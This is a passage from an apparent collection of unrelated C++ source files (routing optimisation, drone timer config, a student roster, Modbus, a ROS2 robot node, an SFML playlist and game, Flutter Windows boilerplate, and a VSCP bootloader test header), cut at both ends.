(cumulated_lookups[rank] < i * thread_lookup_share) {\n        ++rank;\n      }\n      ++rank;\n      _sym_two_opt_rank_limits.push_back(rank);\n    }\n  }\n  _sym_two_opt_rank_limits.push_back(_edges.size());\n}\n\nUserCost LocalSearch::relocate_step() {\n  if (_edges.size() < 3) {\n    // Not enough edges for the operator to make sense.\n    return 0;\n  }\n\n  // Lambda function to search for the best move in a range of\n  // elements from _edges.\n  auto look_up = [&](Index start,\n                     Index end,\n                     UserCost& best_gain,\n                     Index& best_edge_1_start,\n                     Index& best_edge_2_start) {\n    for (Index edge_1_start = start; edge_1_start < end; ++edge_1_start) {\n      Index edge_1_end = _edges[edge_1_start];\n      // Going through the tour while checking for insertion of\n      // edge_1_end between two other nodes (edge_2_*).\n      //\n      // Namely edge_1_start --> edge_1_end --> next is replaced by\n      // edge_1_start --> next while edge_2_start --> edge_2_end is\n      // replaced by edge_2_start --> edge_1_end --> edge_2_end.\n      Index next = _edges[edge_1_end];\n\n      // Precomputing weights not depending on edge_2_*.\n      auto first_potential_add = _matrix[edge_1_start][next];\n      auto edge_1_weight = _matrix[edge_1_start][edge_1_end];\n      auto edge_1_end_next_weight = _matrix[edge_1_end][next];\n\n      if (edge_1_weight + edge_1_end_next_weight - first_potential_add <\n          best_gain) {\n        // if edge_2_start --> edge_2_end is shorter than\n        // edge_2_start --> edge_1_end --> edge_2_end (which it should be)\n        // than the gain can't be larger than the improvement between\n        // edge_1_start --> edge_1_end -",
    "/****************************************************************************\n *\n *   Copyright (C) 2019 PX4 Development Team. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n *\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in\n *    the documentation and/or other materials provided with the\n *    distribution.\n * 3. Neither the name PX4 nor the names of its contributors may be\n *    used to endorse or promote products derived from this software\n *    without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n * \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n * FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n * COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS\n * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED\n * AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n * ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n * POSSIBILITY OF SUCH DAMAGE.\n *\n ****************************************************************************/\n\n#include <px4_arch/io_timer_hw_description.h>\n\nconstexpr io_timers_t io_timers[MAX_IO_TIMERS] = {\n\tinitIOTimer(Timer::Timer1, DMA{DMA::Index2, DMA::Stream5, DMA::Channel6}),\n\tinitIOTimer(Timer::Timer4, DMA{DMA::Index1, DMA::Stream6, DMA::Channel2}),\n};\n\nstatic inline constexpr timer_io_channels_t initIOTimerChannelPulldown(const io_timers_t io_timers_conf[MAX_IO_TIMERS],\n\t\tTimer::TimerChannel timer, GPIO::GPIOPin pin)\n{\n\ttimer_io_channels_t ret = initIOTimerChannel(io_timers_conf, timer, pin);\n\tret.gpio_out |= GPIO_OUTPUT_CLEAR | GPIO_PULLDOWN;\n\treturn ret;\n}\n\nconstexpr timer_io_channels_t timer_io_channels[MAX_TIMER_IO_CHANNELS] = {\n\tinitIOTimerChannelPulldown(io_timers, {Timer::Timer1, Timer::Channel4}, {GPIO::PortE, GPIO::Pin14}),\n\tinitIOTimerChannelPulldown(io_timers, {Timer::Timer1, Timer::Channel3}, {GPIO::PortE, GPIO::Pin13}),\n\tinitIOTimerChannelPulldown(io_timers, {Timer::Timer1, Timer::Channel2}, {GPIO::PortE, GPIO::Pin11}),\n\tinitIOTimerChannelPulldown(io_timers, {Timer::Timer1, Timer::Channel1}, {GPIO::PortE, GPIO::Pin9}),\n\tinitIOTimerChannelPulldown(io_timers, {Timer::Timer4, Timer::Channel2}, {GPIO::PortD, GPIO::Pin13}),\n\tinitIOTimerChannelPulldown(io_timers, {Timer::Timer4, Timer::Channel3}, {GPIO::PortD, GPIO::Pin14}),\n};\n\nconstexpr io_timers_channel_mapping_t io_timers_channel_mapping =\n\tinitIOTimerChannelMapping(io_timers, timer_io_channels);\n",
    "//\n//  student.cpp\n//  ClassRoster2\n//\n//  Created by Parvaty Chery on 2024-04-23.\n//\n\n#include \"student.hpp\" //include the student header file\n#include <iostream>\nusing namespace std;\n\n\n\nStudent::Student(){/*The constructor is used to initialize the variables to defaul values*/\n    \n    this->studentID = \"\"; /*this initializes the student ID to empty string*/\n    this->firstName = \"\"; /*this initializes the student's first name to empty string*/\n    this->lastName = \"\"; /*initializes the student's last name to empty string*/\n    this->emailAddress = \"\"; /*initializes the student's email to empty strings*/\n    this->age = 0; /*initializes student's age to 0*/\n    for (int i = 0; i < daysArray; i++) this->numDays[i] = 0;/*loops throught the array and initializes each element to 0*/\n    this->degreeProgram = DegreeProgram::SECURITY; /*initializes the degree program type to SECURITY*/\n    }\n    \n\n\nStudent::Student(string studentID, string firstName, string lastName, string emailAddress, int age, int numDays[], DegreeProgram degreeProgram){\n    \n    this->studentID = studentID;\n    this->firstName = firstName;\n    this->lastName = lastName;\n    this->emailAddress = emailAddress;\n    this->age = age;\n    for (int i = 0; i < daysArray; i++) this->numDays[i] = numDays[i];\n    this->degreeProgram = degreeProgram;\n}/* In this section, the constructor initialize the variables with the provided values*/\n    \nStudent::~Student(){}\n/*the destructor- even if does nothing dynamically in this case, still need to add it*/\n    \n    //accessors- they will retrieve the values of the member variables\n    \n    string Student::getStudentID() {return this->studentID;} /*returns student id*/\n    string Student::getFirstName()  {return this->firstName;} /*returns first name*/\n    string Student::getLastName() {return this->lastName;}/*returns last name*/\n    string Student::getEmailAddress() {return this-> emailAddress;} /*returns email address*/\n    int Student::getAge(){return this->age;}/*returns age*/\n    int* Student::getNumDays(){return this->numDays;}/*returns the pointer to the array of days spent in each course*/\n    DegreeProgram Student::getDegreeProgram(){return this->degreeProgram;}/*this returns the degree program*/\n    \n    //end of accessors\n\n\n  //beginning of setters or mutators to modidy the values of each variable\n\nvoid Student::setStudentID(string ID){this->studentID = ID;} /*sets the student's id*/\nvoid Student::setFirstName(string firstName){this->firstName = firstName;}/*sets the student first name*/\nvoid Student::setLastName(string lastName){this->lastName = lastName;} /*sets the student's last name*/\nvoid Student::setEmailAddress(string emailAddress){this->emailAddress = emailAddress;} /*sets the student's email*/\nvoid Student::setAge(int age){this->age = age;} /*sets the student's age*/\nvoid Student::setNumDays(int numDays[]){ /*sets each number of days separately*/\n    \n    for (int i = 0; i < daysArray; i++) this->numDays[i] = numDays[i];\n}\nvoid Student::setDegreeProgram(DegreeProgram dp){this->degreeProgram = dp;} /*sets the degree program*/\n//end of setters or mutators\n\n\nvoid Student::printHeader(){//prints out the header\n    \n    cout << \"ID\" << \"\\t\" << \"FIRST\" << \"\\t\" << \"LAST\" << \"\\t\" << \"EMAIL ADDRESS\" << \"\\t\" << \"AGE\" << \"\\t\" << \"DAYS IN COURSE\" << \"\\t\" << \"DEGREE PROGRAM\" << endl; //format of printout for the student data\n};\nvoid Student::print()/*this function prints out the data of a student, including their student id, name, email , age and etc.*/\n//numDays are grabbed separately\n{\n    \n    cout << this->getStudentID() << '\\t';\n    cout << this->getFirstName() << '\\t';\n    cout << this->getLastName() << '\\t';\n    cout << this->getEmailAddress() << '\\t';\n    cout << this->getAge() << '\\t';\n    cout << this->getNumDays()[0] << '\\t';\n    cout << this->getNumDays()[1] << '\\t';\n    cout << this->getNumDays()[2] << '\\t';\n    cout << degreeProgramStrings[this->getDegreeProgram()] << '\\n'; //outputs degree program of the student as a string- reference degree header\n    \n};\n    \n\n",
    "#include <ModbusRTU.h>\n#include <SoftwareSerial.h>\n\n#define TX_G16 16\n#define RX_G17 17\n#define RE_DE_ENABLE 15\n\nfloat InttoFloat(uint16_t Data0, uint16_t Data1){\n  float x;\n  unsigned long *p;\n\n  p = (unsigned long*)&x;\n  *p = (unsigned long)Data0 << 16 | Data1; //Bid-endian\n  return (x);\n}\nSoftwareSerial S(RX_G17, TX_G16); // RX, TX\nModbusRTU mb;\n\nbool cb(Modbus::ResultCode event, uint16_t transactionId, void* data){\n  if(event != Modbus::EX_SUCCESS){\n    Serial.print(\"Request result : 0x\");\n    Serial.print(event, HEX);\n  }\n  return true;\n}\n\n\nvoid setup() {\n  Serial.begin(9600);\n  S.begin(19200, SWSERIAL_8E1);\n  mb.begin(&S,RE_DE_ENABLE);\n  mb.master();\n\n}\n\nuint16_t val[2];\n\nvoid loop() {\n  \n  if (!mb.slave()) {\n    \n    mb.readHreg(2, 3926, val, 2, cb); // Slave id is 1 and register address is 3926 and \n    //we are reading 2 bytes from the register and saving in val\n    while(mb.slave()) { // Check if transaction is active\n      mb.task();\n      delay(100);\n    }\n    Serial.print(\"Register Values \");\n    Serial.print(val[0]);\n    Serial.print(\",\");\n    Serial.println(val[1]);\n    float voltage= InttoFloat(val[1],val[0]);\n    Serial.print(\"Voltage= \");\n    Serial.print(voltage);\n    Serial.println(\" V\");\n\n      }\n  delay(1000);\n}\n",
    "/*  \n*   A basic node for ros2 that runs with ariaCoda\n*   To run use 'ros2 run ariaNode ariaNode -rp /dev/ttyUSB0'\n*\n*   Author: Kieran Quirke-Brown\n*   Date: 12/01/2024\n*/\n\n#include <chrono>\n#include <functional>\n#include <memory>\n#include <string>\n#include <signal.h>\n\n#include <rclcpp/rclcpp.hpp>\n#include <geometry_msgs/msg/twist.hpp>\n\n# include \"Aria/Aria.h\"\n\n//used with signal handler as signal handler function doesn't accept parameters\nbool stopRunning = false;\n\nusing namespace std::chrono_literals;\n/*\n*   Basic ROS node that updates velocity of pioneer robot, Aria doesn't like\n*   being spun as a node therefore we just use a single subscriber\n*   parameters:\n*       forward and ratation speeds are float that are bound to the node\n*       but point at the same location as the aria velocities\n*/\nclass ariaNode : public rclcpp::Node {\n    public:\n        ariaNode(float* forwardSpeed, float* rotationSpeed) : Node(\"Aria_node\") {\n            currentForwardSpeed = forwardSpeed;\n            currentRotationSpeed = rotationSpeed;\n\n            cmdVelSub = create_subscription<geometry_msgs::msg::Twist> (\n                \"cmd_vel\", 10, std::bind(&ariaNode::cmdVelCallback, this, std::placeholders::_1)\n            );    \n        }\n\n    private:\n        void cmdVelCallback(const geometry_msgs::msg::Twist::SharedPtr msg) {\n            \n            double linearSpeed = msg->linear.x;\n            double angularSpeed = msg->angular.z;\n\n            *currentForwardSpeed = linearSpeed;\n            *currentRotationSpeed = angularSpeed;\n\n            RCLCPP_DEBUG(this->get_logger(), \"message received.\");\n\n        }\n\n        rclcpp::Subscription<geometry_msgs::msg::Twist>::SharedPtr cmdVelSub;\n        float* currentForwardSpeed;\n        float* currentRotationSpeed;\n    \n};\n\n// Deals with ctl+c handling to stop the motors correctly.\nvoid my_handler(int s){\n           printf(\"Caught signal %d\\n\",s);\n           stopRunning = true;\n}\n\nint main(int argc, char** argv) {\n    rclcpp::init(argc, argv);\n\n    Aria::init();\n    ArArgumentParser parser(&argc, argv);\n    parser.loadDefaultArguments();\n    ArRobot* robot;\n    robot = new ArRobot();\n\n    signal(SIGINT, my_handler);\n    \n    // RCLCPP_DEBUG(this->get_logger(),\"Trying to connect to robot...\");\n    ArRobotConnector robotConnector(&parser, robot);\n    if(!robotConnector.connectRobot()) {\n        ArLog::log(ArLog::Terse, \"simpleConnect: Could not connect to the robot.\");\n        if(parser.checkHelpAndWarnUnparsed()) {\n            Aria::logOptions();\n            Aria::exit(1);\n        }\n    }\n\n    robot->setAbsoluteMaxTransVel(400);\n\n    float forwardSpeed = 0.0;\n    float rotationSpeed = 0.0;\n    \n    \n    // RCLCPP_DEBUG(aNode->get_logger(),\"Run Async\");\n    robot->runAsync(true);\n    // RCLCPP_DEBUG(aNode->get_logger(),\"Enable Motors\");\n    robot->enableMotors();\n\n    auto aNode = std::make_shared<ariaNode>(&forwardSpeed, &rotationSpeed);\n    RCLCPP_DEBUG(aNode->get_logger(),\"Before Spin!...\");\n\n    /*\n     *   Aria does not like to run in a ros node therefore we run a while loop\n     *   that continuously spins the node to update velocities which are \n     *   then sent using the normal Aria commands.\n    */\n    while (!stopRunning) {\n        rclcpp::spin_some(aNode);\n        // RCLCPP_DEBUG(aNode->get_logger(), \"sending motor command.\");\n            robot->lock();\n            robot->setVel(forwardSpeed * 500);\n            robot->setRotVel(rotationSpeed * 50);\n            robot->unlock();\n            // RCLCPP_DEBUG(aNode->get_logger(), \"motor command sent.\");\n            // RCLCPP_DEBUG(aNode->get_logger(), \"forward speed is now %f.\", forwardSpeed);\n            // RCLCPP_DEBUG(aNode->get_logger(), \"rotational speed is now %f.\", rotationSpeed);\n    }\n    RCLCPP_DEBUG(aNode->get_logger(), \"After Spin\");\n\n    robot->disableMotors();\n    robot->stopRunning();\n    // wait for the thread to stop\n    robot->waitForRunExit();\n\n    // exit\n    RCLCPP_DEBUG(aNode->get_logger(), \"ending Aria node\");\n    Aria::exit(0);\n    return 0;\n}\n",
    "#include \"playlist.h\"\n#include <iostream>\n#include <filesystem>\n#include <SFML/Audio.hpp>\n#include <regex>\n\nsf::SoundBuffer buffer;\n\nnamespace fs = std::filesystem;\nbool debugging = false;\n\nPlaylist::Playlist(bool &debug)\n{\n    debugging = debug;\n}\n\nvoid Playlist::playNextIfFinished()\n{\n    if (m_sound.getStatus() == sf::Sound::Stopped)\n    {\n        // Current song has finished playing, play the next one\n        next();\n    }\n}\n\nvoid Playlist::addSongsFromDirectory(const std::string &directoryPath)\n{\n    if (fs::is_directory(directoryPath))\n    {\n        for (const auto &entry : fs::directory_iterator(directoryPath))\n        {\n            const auto &extension = entry.path().extension();\n            if (extension == \".flac\" || extension == \".ogg\" || extension == \".wav\")\n            {\n                addSong(entry.path().string());\n                if (debugging){\n                    std::cerr << formatFlacMetadata(entry.path().string()) << std::endl;\n                }\n                    \n            }\n        }\n        loading = false;\n    }\n    else\n    {\n        std::cerr << \"Directory is empty or does not exist: \" << directoryPath << std::endl;\n    }\n}\n\nvoid Playlist::addSong(const std::string &filename)\n{\n    if (buffer.loadFromFile(filename))\n    {\n        m_buffers.push_back(buffer);\n    }\n    else\n    {\n        std::cerr << \"Failed to load: \" << filename << std::endl;\n    }\n}\n\nstd::string Playlist::formatFlacMetadata(const std::string &filename)\n{\n    // Define the regular expression pattern to find the split point\n    std::regex pattern(\"_-_\\\\d+_\\\\-_\");\n\n    // Find the position to split the filename\n    std::smatch match;\n    std::string author, title;\n    if (std::regex_search(filename, match, pattern))\n    {\n        // Split the filename based on the regex match\n        // 19 are the characters before the file name, CHANGE THIS  <-------------\n        author = filename.substr(19, match.position() - 19);\n        title = filename.substr(match.position() + match.length());\n    }\n\n    // Replace underscores with spaces\n    std::replace(author.begin(), author.end(), '_', ' ');\n    std::replace(title.begin(), title.end(), '_', ' ');\n\n    // Remove file extensions from the title\n    std::regex fileExtension(\"\\\\.(mp3|flac|wav)(\\\\.flac)?$\");\n    title = std::regex_replace(title, fileExtension, \"\");\n\n    // // Remove leading and trailing whitespaces from author and title\n    author.erase(0, author.find_first_not_of(\" \\t\\r\\n\"));\n    author.erase(author.find_last_not_of(\" \\t\\r\\n\") + 1);\n    title.erase(0, title.find_first_not_of(\" \\t\\r\\n\"));\n    title.erase(title.find_last_not_of(\" \\t\\r\\n\") + 1);\n\n    return \"Autor: \" + author + \"\\nTitle: \" + title;\n}\n\nvoid Playlist::play()\n{\n    if (m_currentIndex >= 0 && m_currentIndex < m_buffers.size())\n    {\n        m_sound.setBuffer(m_buffers[m_currentIndex]);\n        m_sound.play();\n    }\n    else\n    {\n        std::cout << \"Playlist is empty or current index is out of bounds. Cannot play any song.\" << std::endl;\n    }\n}\n\nvoid Playlist::pause()\n{\n    m_sound.pause();\n}\n\nvoid Playlist::stop()\n{\n    m_sound.stop();\n}\n\nvoid Playlist::next()\n{\n    if (++m_currentIndex >= m_buffers.size())\n    {\n        m_currentIndex = 0;\n    }\n    stop();\n    play();\n}\n\nvoid Playlist::previous()\n{\n    if (--m_currentIndex < 0)\n    {\n        m_currentIndex = m_buffers.size() - 1;\n    }\n    stop();\n    play();\n}\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n\nnamespace default_area{\n    int area=0;\n}\n/*\nNamespace = provides a solution for preventing name conflicts\n            in large projects. Each entity needs a uniques name.\n            A namespace allows for identically named entities as\n            long as the namespaces are different.\n*/\n\n\nint main(){\n    /*\n    one can use `using namespace std` but it has thousands of entities and there will be a \n    high likelihood of having a naming conflict eg: std has entitiy data so we cannot set \n    a variable name data. So we can use the below alternative:\n    */\n    using std::cout;\n    using std::cin;\n\n    const double PI = 3.14; //const keyword is used to denote a variable which will never have it's value changed\n    int radius;\n    // PI=8009; if you redeclare the constant variable it will throw an error\n\n    cout << \"\\nEnter the raidus: \";\n    cin >> radius;\n    if (radius==0){\n        // or we can delcare using namespace default_area\n        cout << \"Area: \" << default_area::area << std::endl; \n    }\n\n    else{\n        int area= PI*radius*radius;\n        cout << \"Area: \" << area << std::endl; // `std::endl`==\"\\n\"\n    }\n\n}",
    "#include <SFML/Graphics.hpp>\r\n#include <ctime>\r\n//#include\"../SFML/Images/\"\r\nusing namespace sf;\r\nusing namespace std;\r\n\r\n\r\nstruct coordinats {\r\n\tint x;\r\n\tint y;\r\n};\r\n\r\n\r\n\n//Drawing the background\r\nvoid createBack(RenderWindow& window) {\r\n\t//Drawing the background\r\n\tImage map_image;\r\n\tmap_image.loadFromFile(\"../SFML/Images/backwindow.jpg\");\r\n\tTexture map;\r\n\tmap.loadFromImage(map_image);\r\n\tSprite s_map;\r\n\ts_map.setTexture(map);\r\n\ts_map.setPosition(0, 0);\r\n\twindow.draw(s_map);\r\n}\r\n\r\n//Drawing the map\r\nvoid createMap(RenderWindow& window) {\n\t//Drawing a map\r\n\tImage map_image;//\u043e\u0431\u044a\u0435\u043a\u0442 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0434\u043b\u044f \u043a\u0430\u0440\u0442\u044b\r\n\tmap_image.loadFromFile(\"../SFML/Images/grid.png\");//load the file for the map\r\n\tTexture map;\r\n\tmap.loadFromImage(map_image);\r\n\tSprite s_map;\r\n\ts_map.setTexture(map);\r\n\ts_map.setPosition(300, 160);\r\n\r\n\twindow.draw(s_map);\r\n}\r\n\r\n\r\nint main()\r\n{\r\n\t//Create a window, n*n\r\n\tRenderWindow window(VideoMode(1200, 700), \"Plants Vs Zombies\");\r\n\t//Game icon\r\n\tImage icon;\r\n\tif (!icon.loadFromFile(\"../SFML/Images/icon.png\"))\r\n\t{\r\n\t\treturn 1;\r\n\t}\r\n\twindow.setIcon(32, 32, icon.getPixelsPtr());\r\n\r\n\t///////////////////////////////////////\r\n\r\n\t//Game field (5*9)\r\n\t//Point 137*79 - leftmost point\r\n\t//length 41; width 53\r\n\tconst int ROWS = 5;\n\tconst int COLS = 9;\n\n\tbool FIELD_GAME_STATUS[ROWS][COLS];\n\n\tfor (int i = 0; i < ROWS; i++) {\n    \t\tfor (int j = 0; j < COLS; j++) {\n        \t\tFIELD_GAME_STATUS[i][j] = true;\n    \t\t}\n\t}\n\r\n\tClock timeMoney;\r\n\t\r\n\r\n\r\n\tClock clock;\r\n\r\n\twhile (window.isOpen())\r\n\t{\r\n\t\tfloat time = clock.getElapsedTime().asMicroseconds();\r\n\t\tfloat moneyTime = timeMoney.getElapsedTime().asSeconds();\r\n\r\n\t\tclock.restart();\r\n\t\ttime = time / 800;\r\n\r\n\t\tEvent event;\r\n\t\twhile (window.pollEvent(event))\r\n\t\t{\r\n\t\t\tif (event.type == Event::Closed)\r\n\t\t\t\twindow.close();\r\n\t\t}\r\n\r\n\t\t//Create a background\r\n\t\tcreateBack(window);\r\n\t\tcreateMap(window);\r\n\t\r\n\r\n\t\t\r\n\r\n\t\twindow.setSize(sf::Vector2u(550, 340));\r\n\t\twindow.display();\r\n\t}\r\n\treturn 0;\r\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"tp1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// btest.h\n//\n// This file is part of the VSCP (https://www.vscp.org)\n//\n// The MIT License (MIT)\n//\n// Copyright \u00a9 2000-2024 Ake Hedman, Grodans Paradis AB\n// <info@grodansparadis.com>\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n// of this software and associated documentation files (the \"Software\"), to deal\n// in the Software without restriction, including without limitation the rights\n// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n// copies of the Software, and to permit persons to whom the Software is\n// furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n// all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n// SOFTWARE.\n//\n\n#ifdef WIN32\n#include <pch.h>\n#endif\n\n#ifndef WIN32\n\n#else\n#include <windows.h>\n#endif\n\n#include <string.h>\n\n#include \"btest.h\"\n#include <vscp.h>\n#include <vscphelper.h>\n\n#include \"vscp-client-socketcan.h\"\n\n#include <vscp-bootloader.h>\n\n#include <mustache.hpp>\n\n#include <QDebug>\n#include <QDir>\n#include <QFile>\n#include <QJSEngine>\n#include <QJsonArray>\n#include <QJsonObject>\n#include <QMainWindow>\n#include <QMessageBox>\n#include <QSemaphore>\n#include <QSettings>\n#include <QStandardPaths>\n#include <QTextDocument>\n#include <QUuid>\n\n#include <spdlog/async.h>\n#include <spdlog/sinks/rotating_file_sink.h>\n#include <spdlog/sinks/stdout_color_sinks.h>\n#include <spdlog/spdlog.h>\n\n#include <nlohmann/json.hpp>\n\n// for convenience\nusing json = nlohmann::json;\nusing namespace kainjow::mustache;\n\n// Prototype\nvoid*\nworkerThread(void* pData);\n\n///////////////////////////////////////////////////////////////////////////////\n// btest\n//\n\nbtest::btest(int& argc, char** argv)\n  